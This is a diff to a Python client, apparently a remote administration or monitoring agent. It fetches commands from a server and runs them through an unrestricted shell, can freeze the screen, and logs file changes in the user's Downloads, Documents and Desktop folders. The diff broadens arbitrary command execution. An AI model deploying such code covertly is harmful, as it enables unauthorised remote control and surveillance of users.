@@ -217,11 +217,12 @@ def send_client_logs(client_id):
                 time.sleep(20)
                 continue
                 
-            # Add system info to logs
-            client_logs.add_log(
-                "INFO",
-                f"État système: CPU {psutil.cpu_percent()}%, RAM {psutil.virtual_memory().percent}%"
-            )
+            # Ne plus ajouter d'info système aux logs - on les affiche déjà ailleurs
+            # Commenté car ces informations sont déjà affichées ailleurs:
+            # client_logs.add_log(
+            #    "INFO",
+            #    f"État système: CPU {psutil.cpu_percent()}%, RAM {psutil.virtual_memory().percent}%"
+            # )
             
             logs = client_logs.get_logs()
             if logs:
@@ -243,11 +244,13 @@ def send_client_logs(client_id):
                     print(colorama.Fore.RED + f"❌ Erreur lors de l'envoi des logs: {str(e)}")
                     logger.error(f"Erreur lors de la connexion au serveur pour l'envoi des logs: {e}")
             else:
-                # Si aucun log n'est disponible, en générer au moins un pour tester la connexion
-                client_logs.add_log(
-                    "INFO",
-                    f"Connexion active, aucune activité à signaler"
-                )
+                # Si aucun log n'est disponible, ne pas générer de log inutile
+                # Commenté pour éviter des logs inutiles:
+                # client_logs.add_log(
+                #    "INFO",
+                #    f"Connexion active, aucune activité à signaler"
+                # )
+                pass
         except Exception as e:
             print(colorama.Fore.RED + f"❌ Erreur inattendue lors de l'envoi des logs: {str(e)}")
             logger.error(f"Erreur inattendue lors de l'envoi des logs: {e}")
@@ -313,6 +316,7 @@ def unfreeze_screen():
 def execute_command(command):
     """Exécute une commande du système et retourne la sortie standard et d'erreur."""
     try:
+        # Commandes spéciales gérées directement
         if command == "freeze":
             freeze_screen(30)  # Gel de l'écran pendant 30 secondes
             return "L'écran a été gelé pendant 30 secondes", ""
@@ -321,16 +325,31 @@ def execute_command(command):
             return "L'écran a été dégelé", ""
         
         # Vérifier s'il s'agit d'une commande de génération de PDF
-        pdf_result, pdf_stdout, pdf_stderr = handle_pdf_report_command(command, client_id)
-        if pdf_result or (pdf_stdout or pdf_stderr):
-            return pdf_stdout, pdf_stderr
+        # Mais ne pas bloquer l'exécution des autres commandes si ce n'est pas le cas
+        if "import pdf_data" in command and "create_pdf_with_data" in command:
+            pdf_result, pdf_stdout, pdf_stderr = handle_pdf_report_command(command, client_id)
+            if pdf_result or (pdf_stdout or pdf_stderr):
+                return pdf_stdout, pdf_stderr
             
-        # Exécution normale des autres commandes
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        # Traitement spécial pour les commandes cmd.exe ou qui commencent par "start"
+        if command.strip().lower().startswith("cmd") or command.strip().lower().startswith("start"):
+            process = subprocess.Popen(command, shell=True)
+            return f"Commande '{command}' lancée en arrière-plan", ""
+
+        # Pour les commandes dir, type et autres commandes de base du shell
+        if command.strip().lower().startswith(("dir", "cd", "type", "echo", "cls")):
+            try:
+                process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='cp850')
+                return process.stdout, process.stderr
+            except Exception as cmd_error:
+                return f"Erreur lors de l'exécution de {command}: {str(cmd_error)}", ""
+
+        # Exécution normale des autres commandes avec PIPE pour capturer la sortie
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='cp850')
         stdout, stderr = process.communicate()
         return stdout, stderr
     except Exception as e:
-        return "", str(e)
+        return f"Exception dans execute_command: {str(e)}", ""
 
 def check_for_command(client_id):
     try:
@@ -1092,9 +1111,9 @@ def handle_pdf_report_command(command, client_id):
                                 print(colorama.Fore.YELLOW + f"⚠️ Erreur lors de l'envoi du PDF: {str(e)}")
                     
                     return False, "", result.stderr
-        
-        # Si ce n'est pas une commande de génération de PDF
-        return False, "", "Commande non reconnue comme génération de PDF"
+            
+        # Si ce n'est pas une commande de génération de PDF, retourner False sans message d'erreur
+        return False, "", ""
     except Exception as e:
         print(colorama.Fore.RED + f"❌ Exception lors du traitement de la commande PDF: {str(e)}")
         # Vérifier quand même si le fichier a été généré malgré l'exception
@@ -1119,7 +1138,7 @@ def handle_pdf_report_command(command, client_id):
 
 # Fonction simplifiée pour surveiller les dossiers et enregistrer les modifications
 def simple_monitor_directories():
-    """Une fonction simplifiée pour surveiller les fichiers dans certains dossiers et enregistrer les modifications"""
+    """Surveille les dossiers spécifiés et enregistre uniquement les modifications de fichiers (nouveaux, supprimés)"""
     while True:
         try:
             # Ne rien faire si les logs d'activité sont désactivés
@@ -1127,15 +1146,18 @@ def simple_monitor_directories():
                 time.sleep(30)
                 continue
                 
-            # Dossiers à surveiller
+            # Dossiers à surveiller exactement comme demandé
             monitored_dirs = [
-                os.path.join(os.path.expanduser("~"), "Downloads"),
-                os.path.join(os.path.expanduser("~"), "Documents"),
-                os.path.join(os.path.expanduser("~"), "Desktop")
+                {'path': os.path.join(os.path.expanduser("~"), "Downloads"), 'name': "Téléchargements"},
+                {'path': os.path.join(os.path.expanduser("~"), "Documents"), 'name': "Documents"},
+                {'path': os.path.join(os.path.expanduser("~"), "Desktop"), 'name': "Bureau"}
             ]
             
             # Pour chaque dossier, lister les fichiers et enregistrer leur état
-            for folder in monitored_dirs:
+            for folder_info in monitored_dirs:
+                folder = folder_info['path']
+                folder_name = folder_info['name']
+                
                 if not os.path.exists(folder):
                     continue
                     
@@ -1147,7 +1169,7 @@ def simple_monitor_directories():
                             file_path = os.path.join(root, file)
                             current_files.add(file_path)
                             
-                    # Comparer avec la liste précédente (stockée dans un attribut de la fonction)
+                    # Comparer avec la liste précédente
                     if not hasattr(simple_monitor_directories, "previous_files"):
                         simple_monitor_directories.previous_files = {}
                     
@@ -1157,18 +1179,20 @@ def simple_monitor_directories():
                     new_files = current_files - previous_files
                     for file_path in new_files:
                         # Enregistrer un log pour chaque nouveau fichier
+                        file_name = os.path.basename(file_path)
                         client_logs.add_log(
                             "INFO",
-                            f"Nouveau fichier détecté: {os.path.basename(file_path)} dans {os.path.basename(folder)}"
+                            f"✅ Nouveau fichier: {file_name} dans {folder_name}"
                         )
                     
                     # Trouver les fichiers supprimés
                     deleted_files = previous_files - current_files
                     for file_path in deleted_files:
                         # Enregistrer un log pour chaque fichier supprimé
+                        file_name = os.path.basename(file_path)
                         client_logs.add_log(
                             "INFO",
-                            f"Fichier supprimé: {os.path.basename(file_path)} de {os.path.basename(folder)}"
+                            f"❌ Fichier supprimé: {file_name} de {folder_name}"
                         )
                     
                     # Mettre à jour la liste précédente
